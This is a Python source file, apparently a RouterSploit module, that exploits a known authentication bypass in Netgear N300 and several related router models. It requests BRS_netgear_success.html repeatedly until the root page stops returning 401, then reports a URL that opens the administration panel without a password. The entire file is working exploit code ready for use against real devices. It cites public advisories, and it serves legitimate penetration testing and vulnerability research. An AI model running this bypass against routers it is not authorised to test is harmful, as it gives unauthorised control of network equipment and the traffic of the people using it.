from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Netgear N300 Authentication Bypass vulnerability.
    If the target is vulnerable link to bypass authentication will be provided"
    """
    __info__ = {
        'name': 'Netgear N300 Auth Bypass',
        'description': 'Module exploits authentication bypass vulnerability in Netgear N300 devices. It is possible to access administration panel without providing password.',
        'authors': [
            'Daniel Haake <daniel.haake[at]csnc.de>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2015-007_Netgear_WNR1000v4_AuthBypass.txt',
            'http://www.shellshocklabs.com/2015/09/part-1en-hacking-netgear-jwnr2010v5.html',
        ],
        'devices': [
            'Netgear N300',
            'Netgear JNR1010v2',
            'Netgear JNR3000',
            'Netgear JWNR2000v5',
            'Netgear JWNR2010v5',
            'Netgear R3250',
            'Netgear WNR2020',
            'Netgear WNR614',
            'Netgear WNR618',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}".format(self.target, self.port)
            print_info("Visit: {}/\n".format(url))
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        # unauthorized
        if response.status_code == 401:
            url = "{}:{}/BRS_netgear_success.html".format(self.target, self.port)

            for _ in range(0, 3):
                response = http_request(method="GET", url=url)
                if response is None:
                    return False  # target is not vulnerable

            url = "{}:{}/".format(self.target, self.port)
            response = http_request(method="GET", url=url)
            if response is None:
                return False  # target is not vulnerable

            # authorized
            if response.status_code == 200:
                return True  # target is vulnerable

        return False  # target not vulnerable
